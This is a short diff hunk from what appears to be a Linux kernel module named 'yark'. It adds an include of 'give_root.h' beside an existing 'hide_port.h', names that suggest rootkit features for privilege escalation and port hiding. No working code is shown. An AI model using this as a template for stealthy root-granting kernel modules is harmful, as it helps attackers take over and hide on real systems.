@@ -5,6 +5,8 @@
 #include "hide_port.h"
 #include "main.h"
 
+#include "give_root.h"
+
 
 static int __init yark_init(void)
 {
